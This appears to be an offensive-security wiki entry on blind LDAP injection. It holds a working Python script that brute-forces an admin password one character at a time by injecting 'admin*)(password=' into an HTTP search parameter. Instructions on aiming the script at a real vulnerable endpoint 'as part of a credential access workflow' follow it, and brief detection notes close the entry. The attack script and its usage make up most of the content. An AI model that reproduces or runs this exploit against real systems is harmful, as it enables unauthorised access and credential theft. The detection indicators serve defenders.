---
id: 6004cf3a-6b68-4703-805f-71fe1beb0b51
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:01.731221+00:00'
updated_at: '2023-04-10T20:36:29.433607+00:00'
tags:
  - '[[tags/LDAP Injection]]'
  - '[[tags/Scripts]]'
  - '[[tags/Special blind LDAP injection (without "*")]]'
platforms:
  - Web
validated: true
---

# Python-LDAP-Injection-Password-Brute-Forcer

## Code

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

## Description

This Python script performs a blind brute-force attack on an admin password via LDAP injection. It iteratively tests characters from a defined alphabet for each password position by crafting injected LDAP queries in HTTP GET requests. A match is detected when the server response contains "TRUE CONDITION", indicating a valid partial password, allowing the script to build the full password without direct error feedback.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| TARGET_URL | Base URL of the vulnerable endpoint (modify in code) | "http://target.com?action=dir&search=" |
| ALPHABET | String of possible password characters (already defined) | "string.ascii_letters + string.digits + \"_@{}-/()!\"$%=^[]:;\" " |
| MAX_LENGTH | Maximum password length to attempt (loop range) | 50 |

## Usage

Save the code as a .py file, make it executable (`chmod +x script.py`), and run with `python3 script.py`. Before execution, update the TARGET_URL in the requests.get line to point to the vulnerable search endpoint. Use in scenarios where a web app's LDAP query is injectable, such as directory searches. This is typically part of a credential access workflow after discovering the injection point.

## Detection

- Web server logs showing repeated GET requests with escalating payloads like "admin*)(password=a", "admin*)(password=ab", etc., from the same IP.
- LDAP server logs indicating malformed queries or excessive authentication attempts.
- Network monitoring for high-volume HTTP traffic to the search endpoint without corresponding user activity.
- Application-level anomalies, such as delays in response times due to brute-force loops.

## Related

- [[procedures/Blind-LDAP-Injection-Password-Brute-Force]]
